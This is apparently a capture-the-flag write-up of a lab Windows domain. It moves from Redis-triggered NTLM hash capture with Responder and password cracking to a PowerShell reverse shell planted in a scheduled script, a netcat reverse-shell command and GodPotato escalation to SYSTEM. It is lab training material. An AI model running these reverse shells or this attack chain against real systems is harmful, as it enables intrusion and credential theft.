# [VulneNet:Active](https://tryhackme.com/room/vulnnetactive)

## Recon

```
 rustscan -a 10.49.152.33 -r 1-65535 --ulimit 5000   
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Scanning ports: The virtual equivalent of knocking on doors.


PORT      STATE SERVICE      REASON
53/tcp    open  domain       syn-ack ttl 126
135/tcp   open  msrpc        syn-ack ttl 126
139/tcp   open  netbios-ssn  syn-ack ttl 126
445/tcp   open  microsoft-ds syn-ack ttl 126
464/tcp   open  kpasswd5     syn-ack ttl 126
6379/tcp  open  redis        syn-ack ttl 126
9389/tcp  open  adws         syn-ack ttl 126
49666/tcp open  unknown      syn-ack ttl 126
49668/tcp open  unknown      syn-ack ttl 126
49669/tcp open  unknown      syn-ack ttl 126
49670/tcp open  unknown      syn-ack ttl 126
49677/tcp open  unknown      syn-ack ttl 126
49690/tcp open  unknown      syn-ack ttl 126
49778/tcp open  unknown      syn-ack ttl 126
``` 
- A quick all port scan with RustScan 
- Then I run Nmap against these open ports
```
cat rustscan.txt | awk -F '/' '{print $1}' | paste -sd ',' -
53,135,139,445,464,6379,9389,49666,49668,49669,49670,49677,49690,49778
```
- Nmap_scan

```
# Nmap 7.98 scan initiated Sat Feb  7 12:16:20 2026 as: /usr/lib/nmap/nmap --privileged -sC -sV -p53,135,139,445,464,6379,9389,49666,49668,49669,49670,49677,49690,49778 -oN nmap_scan 10.49.152.33
Nmap scan report for 10.49.152.33
Host is up (0.024s latency).

PORT      STATE SERVICE       VERSION
	53/tcp    open  domain        Simple DNS Plus
	135/tcp   open  msrpc         Microsoft Windows RPC
	139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
	445/tcp   open  microsoft-ds?
	464/tcp   open  kpasswd5?
	6379/tcp  open  redis         Redis key-value store 2.8.2402
	9389/tcp  open  mc-nmf        .NET Message Framing
	49666/tcp open  msrpc         Microsoft Windows RPC
	49668/tcp open  msrpc         Microsoft Windows RPC
	49669/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
	49670/tcp open  msrpc         Microsoft Windows RPC
	49677/tcp open  msrpc         Microsoft Windows RPC
	49690/tcp open  msrpc         Microsoft Windows RPC
	49778/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: -1s	
| smb2-time: 
|   date: 2026-02-07T06:47:18
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Feb  7 12:17:56 2026 -- 1 IP address (1 host up) scanned in 96.13 seconds
```
- Port 464(Kerberos password change) is open, so this may be an AD environment.
- Well, port 445 smb was open, but got nothing. No anonymous login.
- Lets enumerate it using enum4linux and enum4linux-ng(next generation version of enum4linux)
- enum4 linux got nothing but the enum4linux-ng got some useful information

```
enum4linux-ng -A 10.49.151.127
 ============================================================
|    Domain Information via SMB session for 10.49.151.127    |
 ============================================================
[*] Enumerating via unauthenticated SMB session on 445/tcp
[+] Found domain information via SMB
NetBIOS computer name: VULNNET-BC3TCK1
NetBIOS domain name: VULNNET
DNS domain: vulnnet.local
FQDN: VULNNET-BC3TCK1SHNQ.vulnnet.local
Derived membership: domain member
Derived domain: VULNNET

 ==========================================
|    RPC Session Check on 10.49.151.127    |
 ==========================================
[*] Check for anonymous access (null session)
[+] Server allows authentication via username '' and password ''
[*] Check for guest access
[-] Could not establish guest session: STATUS_LOGON_FAILURE

 ====================================================
|    Domain Information via RPC for 10.49.151.127    |
 ====================================================
[+] Domain: VULNNET
[+] Domain SID: S-1-5-21-1405206085-1650434706-76331420
[+] Membership: domain member

 ================================================
|    OS Information via RPC for 10.49.151.127    |
 ================================================
[*] Enumerating via unauthenticated SMB session on 445/tcp
[+] Found OS information via SMB
[*] Enumerating via 'srvinfo'
[-] Could not get OS info via 'srvinfo': STATUS_ACCESS_DENIED
[+] After merging OS information we have the following result:
OS: Windows 10, Windows Server 2019, Windows Server 2016
OS version: '10.0'
OS release: '1809'
OS build: '17763'
Native OS: not supported
Native LAN manager: not supported
Platform id: null
Server type: null
Server type string: null
```

- We got a domain name for the server. lets add it to our /etc/hosts file.
```
echo "10.49.151.127  VULNNET-BC3TCK1SHNQ.vulnnet.local  vulnnet.local" | sudo tee -a /etc/hosts
10.49.151.127  VULNNET-BC3TCK1SHNQ.vulnnet.local  vulnnet.local
```
- The port **6379** seems intresting. It is running a service called Redis
- Redis is an in-memory key–value database. The version of Redis is **2.8.2402**

- I tried connecting to it without creds, and it worked.

```
redis-cli -h 10.49.151.127

10.49.151.127:6379> 
10.49.151.127:6379> INFO
# Server
redis_version:2.8.2402
redis_git_sha1:00000000
redis_git_dirty:0
redis_build_id:b2a45a9622ff23b7
redis_mode:standalone
os:Windows  
arch_bits:64
multiplexing_api:winsock_IOCP
process_id:1432
run_id:e0a4b1e9cf90824759010f8ca202fcb23d9f4433
tcp_port:6379
uptime_in_seconds:1840
uptime_in_days:0
hz:10
lru_clock:8847950
config_file:
```
- The INFO command give detalies about the server version, and clients connects etc...
- Now we have confirmed the version of redis runnign on the system. 
- Well, I found CVE-2025-49844 - Redis Lua Interpreter UAF Exploit. all redis vrsoin below 8 are vulnerable, but it did'nt worked in our case.

- We are in active directory environment lets try LLMNR poisoning attack.
- LLMNR (Link-Local Multicast Name Resolution) poisoning is a Man-in-the-Middle (MitM) attack that exploits a default Windows networking feature to steal user credentials and gain unauthorized access to a network. It is a highly effective, common, and often quiet attack used in Active Directory environments. 
```
  1LLMNR is used for name resolution.
  If DNS fails, Windows falls back to LLMNR.
  If we poison the response, the client will authenticate to us using NTLM, and we can capture the NTLM hash.
```

- Well i started responder on the tun0 interface 
```
sudo responder -I tun0
```
 - Respoder is widely used for capturing network credentials.
 - Then we have to trick the client to make a LLMNR request. I am going to use redis service. 
 ```
redis-cli -h 10.49.156.111                                                   
10.49.156.111:6379> CONFIG SET dir \\192.168.133.63\spider\spider.txt
(error) ERR Changing directory: Permission denied
10.49.156.111:6379> 
````
-In the above command, I changed Redis’s working directory to a fake SMB share. As a result, the target system attempted to authenticate to the fake SMB server.

```
sudo responder -I tun0
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|


[*] Tips jar:
    USDT -> 0xCc98c1D3b8cd9b717b5257827102940e4E17A19A
    BTC  -> bc1q9360jedhhmps5vpl3u05vyg4jryrl52dmazz49

[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]
    DHCP                       [OFF]
    DHCPv6                     [OFF]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [OFF]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    MQTT server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]
    SNMP server                [ON]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Force ESS downgrade        [OFF]

[+] Generic Options:
    Responder NIC              [tun0]
    Responder IP               [192.168.133.63]
    Responder IPv6             [fe80::9bb0:b200:80b0:a6ca]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP', 'ISATAP.LOCAL']
    Don't Respond To MDNS TLD  ['_DOSVC']
    TTL for poisoned response  [default]

[+] Current Session Variables:
    Responder Machine Name     [WIN-YON80JNDAOA]
    Responder Domain Name      [95XR.LOCAL]
    Responder DCE-RPC Port     [45649]

[*] Version: Responder 3.2.2.0
[*] Author: Laurent Gaffie, <lgaffie@secorizon.com>

[+] Listening for events...

[SMB] NTLMv2-SSP Client   : 10.49.156.111
[SMB] NTLMv2-SSP Username : VULNNET\enterprise-security
[SMB] NTLMv2-SSP Hash     : enterprise-security::VULNNET:58822701e2340485:774E5222D0F7465D3EF74AE90FDC9BE7:0101000000000000800E3F757398DC010F83DAA492F793250000000002000800390035005800520001001E00570049004E002D0059004F004E00380030004A004E00440041004F00410004003400570049004E002D0059004F004E00380030004A004E00440041004F0041002E0039003500580052002E004C004F00430041004C000300140039003500580052002E004C004F00430041004C000500140039003500580052002E004C004F00430041004C0007000800800E3F757398DC0106000400020000000800300030000000000000000000000000300000CA62B6F77AA8C778D0640CC131D1046BD1F24B9288CD9564B46CAF8DAD558C970A001000000000000000000000000000000000000900260063006900660073002F003100390032002E003100360038002E003100330033002E00360033000000000000000000
```
- We got NTLM hash. Let's crack it.
```
enterprise-security::VULNNET:58822701e2340485:774E5222D0F7465D3EF74AE90FDC9BE7:0101000000000000800E3F757398DC010F83DAA492F793250000000002000800390035005800520001001E00570049004E002D0059004F004E00380030004A004E00440041004F00410004003400570049004E002D0059004F004E00380030004A004E00440041004F0041002E0039003500580052002E004C004F00430041004C000300140039003500580052002E004C004F00430041004C000500140039003500580052002E004C004F00430041004C0007000800800E3F757398DC0106000400020000000800300030000000000000000000000000300000CA62B6F77AA8C778D0640CC131D1046BD1F24B9288CD9564B46CAF8DAD558C970A001000000000000000000000000000000000000900260063006900660073002F003100390032002E003100360038002E003100330033002E00360033000000000000000000
```
- I used John to crack the hash
```
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 16 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
sand_0873959498  (enterprise-security)     
1g 0:00:00:02 DONE (2026-02-07 21:38) 0.4329g/s 1737Kp/s 1737Kc/s 1737KC/s sanjaym3..sand36
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed. 
```
- credentials **enterprise-security:sand_0873959498**

## Enumeration 

- smb enumeration
```
 smbclient -L //10.49.156.111 -U enterprise-security                                5s
Password for [WORKGROUP\enterprise-security]:

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	Enterprise-Share Disk      
	IPC$            IPC       Remote IPC
	NETLOGON        Disk      Logon server share 
	SYSVOL          Disk      Logon server share 
```
- That Enterprise-Share share looks odd, right? lets see what's inside  

```
smbclient  //10.49.144.177/Enterprise-Share --user enterprise-security   5s  py_venv
Password for [WORKGROUP\enterprise-security]:
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Wed Feb 24 04:15:41 2021
  ..                                  D        0  Wed Feb 24 04:15:41 2021
  PurgeIrrelevantData_1826.ps1        A       69  Wed Feb 24 06:03:18 2021

		9558271 blocks of size 4096. 5088763 blocks available
smb: \> get PurgeIrrelevantData_1826.ps1
getting file \PurgeIrrelevantData_1826.ps1 of size 69 as PurgeIrrelevantData_1826.ps1 (0.6 KiloBytes/sec) (average 0.6 KiloBytes/sec)
```
- We got a PowerShell script with the following content inside it. 
```
rm -Force C:\Users\Public\Documents\* -ErrorAction SilentlyContinue
```
- The script cleaning the Documents direcotry it may be a scheduled task. 
- So I want to upload a revshell. For that i downloaded the PowerShell script and appended my rev shell to it.
```
rm -Force C:\Users\Public\Documents\* -ErrorAction SilentlyContinue
$LHOST = "192.168.133.63"; $LPORT = 4444; $TCPClient = New-Object Net.Sockets.TCPClient($LHOST, $LPORT); $NetworkStream = $TCPClient.GetStream(); $StreamReader = New-Object IO.StreamReader($NetworkStream); $StreamWriter = New-Object IO.StreamWriter($NetworkStream); $StreamWriter.AutoFlush = $true; $Buffer = New-Object System.Byte[] 1024; while ($TCPClient.Connected) { while ($NetworkStream.DataAvailable) { $RawData = $NetworkStream.Read($Buffer, 0, $Buffer.Length); $Code = ([text.encoding]::UTF8).GetString($Buffer, 0, $RawData -1) }; if ($TCPClient.Connected -and $Code.Length -gt 1) { $Output = try { Invoke-Expression ($Code) 2>&1 } catch { $_ }; $StreamWriter.Write("$Output`n"); $Code = $null } }; $TCPClient.Close(); $NetworkStream.Close(); $StreamReader.Close(); $StreamWriter.Close()
```
- Then I overwrite the existing script with the one I created using the **put** command.
```
 smbclient  //10.49.144.177/Enterprise-Share --user enterprise-security  11s  py_venv
Password for [WORKGROUP\enterprise-security]:
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Wed Feb 24 04:15:41 2021
  ..                                  D        0  Wed Feb 24 04:15:41 2021
  PurgeIrrelevantData_1826.ps1        A       69  Wed Feb 24 06:03:18 2021

		9558271 blocks of size 4096. 5088473 blocks available
smb: \> put PurgeIrrelevantData_1826.ps1
putting file PurgeIrrelevantData_1826.ps1 as \PurgeIrrelevantData_1826.ps1 (12.6 kB/s) (average 12.6 kB/s)
```
- Then I started a Metasploit multi/handler listener. And bam! I got the shell. 
- Then I used the **post/multi/manage/shell_to_meterpreter** module to upgrade my normal shell to a meterpreter shell.
## User.txt 
- In the Enterprise-Security user desktop directory, we can find the flag
```
meterpreter > dir
Listing: C:\Users\enterprise-security\Desktop
=============================================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100666/rw-rw-rw-  282   fil   2021-02-24 03:32:58 +0530  desktop.ini
100666/rw-rw-rw-  37    fil   2021-02-24 09:54:02 +0530  user.txt
```
**User.txt:THM{3eb176aee96432d5b100bc93580b291e}**


## Privilege escalation 

```
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeMachineAccountPrivilege     Add workstations to domain                Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled

```

```
systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
OS Name:                   Microsoft Windows Server 2019 Datacenter Evaluation
OS Version:                10.0.17763 N/A Build 17763
```
- The user has SeImpersonatePrivilege privilege enabled, which means we can impersonate any user.  
- I found this [github](https://github.com/BeichenDream/GodPotato.git). We can use this GodPotato privilege escalation technique to escalate privilege as SYSTEM.
- Go to this [releases](https://github.com/BeichenDream/GodPotato/releases) page and download the GodPotato-NET4.exe then upload it to the box.
```
meterpreter > upload GodPotato-NET4.exe
[*] Uploading  : /home/light/TryHackMe/VulnNet_Active/GodPotato-NET4.exe -> GodPotato-NET4.exe
[*] Uploaded 56.00 KiB of 56.00 KiB (100.0%): /home/light/TryHackMe/VulnNet_Active/GodPotato-NET4.exe -> GodPotato-NET4.exe
[*] Completed  : /home/light/TryHackMe/VulnNet_Active/GodPotato-NET4.exe -> GodPotato-NET4.exe
```
-  In the meterpreter terminal, enter **shell** and we get a Windows command line. The enter the below
```
C:\Users\enterprise-security\Downloads> GodPotato-NET4.exe -cmd "cmd /c whoami"

GodPotato-NET4.exe -cmd "cmd /c whoami"
[*] CombaseModule: 0x140726291726336
[*] DispatchTable: 0x140726294043824
[*] UseProtseqFunction: 0x140726293422720
[*] UseProtseqFunctionParamCount: 6
[*] HookRPC
[*] Start PipeServer
[*] CreateNamedPipe \\.\pipe\6ff07d48-7439-4080-b115-cf0c7ed70d0c\pipe\epmapper
[*] Trigger RPCSS
[*] DCOM obj GUID: 00000000-0000-0000-c000-000000000046
[*] DCOM obj IPID: 0000b802-0eb0-ffff-e0e8-468bb968a242
[*] DCOM obj OXID: 0x629dd282325c6804
[*] DCOM obj OID: 0x9779b6d76471ea56
[*] DCOM obj Flags: 0x281
[*] DCOM obj PublicRefs: 0x0
[*] Marshal Object bytes len: 100
[*] UnMarshal Object
[*] Pipe Connected!
[*] CurrentUser: NT AUTHORITY\NETWORK SERVICE
[*] CurrentsImpersonationLevel: Impersonation
[*] Start Search System Token
[*] PID : 860 Token:0x816  User: NT AUTHORITY\SYSTEM ImpersonationLevel: Impersonation
[*] Find System Token : True
[*] UnmarshalObject: 0x80070776
[*] CurrentUser: NT AUTHORITY\SYSTEM
[*] process start with pid 404
```
- Worked, now we can run commands as SYSTEM. lets run a reverse shell 
- I created a shell.PS1 script and uploaded it to the box
```
$LHOST = "192.168.133.63"; $LPORT = 3333; $TCPClient = New-Object Net.Sockets.TCPClient($LHOST, $LPORT); $NetworkStream = $TCPClient.GetStream(); $StreamReader = New-Object IO.StreamReader($NetworkStream); $StreamWriter = New-Object IO.StreamWriter($NetworkStream); $StreamWriter.AutoFlush = $true; $Buffer = New-Object System.Byte[] 1024; while ($TCPClient.Connected) { while ($NetworkStream.DataAvailable) { $RawData = $NetworkStream.Read($Buffer, 0, $Buffer.Length); $Code = ([text.encoding]::UTF8).GetString($Buffer, 0, $RawData -1) }; if ($TCPClient.Connected -and $Code.Length -gt 1) { $Output = try { Invoke-Expression ($Code) 2>&1 } catch { $_ }; $StreamWriter.Write("$Output`n"); $Code = $null } }; $TCPClient.Close(); $NetworkStream.Close(); $StreamReader.Close(); $StreamWriter.Close()
```
- Well, the above method didn't work, so I tried uploading a netcat executable and tried to get a netcat revshell

```
GodPotato-Net4.exe -cmd  "cmd /c C:\Users\enterprise-security\Downloads\nc64.exe -e cmd.exe 192.168.133.63 3333"
```
- But I had an issue with the netcat executable. It didn't work for me. I don't have time to troubleshoot it.
- Then I read other's writeups. I found the flag location, so I tried to read the file contents.

```
C:\Users\enterprise-security\Downloads>GodPotato-Net4.exe -cmd  "cmd /c type C:\Users\Administrator\Desktop\system.txt"
GodPotato-Net4.exe -cmd  "cmd /c type C:\Users\Administrator\Desktop\system.txt"
[*] CombaseModule: 0x140712054620160
[*] DispatchTable: 0x140712056937648
[*] UseProtseqFunction: 0x140712056316544
[*] UseProtseqFunctionParamCount: 6
[*] HookRPC
[*] Start PipeServer
[*] CreateNamedPipe \\.\pipe\1686dbea-7e5a-4519-8137-6e5851c02818\pipe\epmapper
[*] Trigger RPCSS
[*] DCOM obj GUID: 00000000-0000-0000-c000-000000000046
[*] DCOM obj IPID: 0000ac02-0e10-ffff-37dd-4cc736563ae9
[*] DCOM obj OXID: 0x47eb173781b676fe
[*] DCOM obj OID: 0x9f7f6235cdf01cc6
[*] DCOM obj Flags: 0x281
[*] DCOM obj PublicRefs: 0x0
[*] Marshal Object bytes len: 100
[*] UnMarshal Object
[*] Pipe Connected!
[*] CurrentUser: NT AUTHORITY\NETWORK SERVICE
[*] CurrentsImpersonationLevel: Impersonation
[*] Start Search System Token
[*] PID : 864 Token:0x812  User: NT AUTHORITY\SYSTEM ImpersonationLevel: Impersonation
[*] Find System Token : True
[*] UnmarshalObject: 0x80070776
[*] CurrentUser: NT AUTHORITY\SYSTEM
[*] process start with pid 192
THM{d540c0645975900e5bb9167aa431fc9b}
C:\Users\enterprise-security\Downloads>
```
 **Root.txt:THM{d540c0645975900e5bb9167aa431fc9b}**
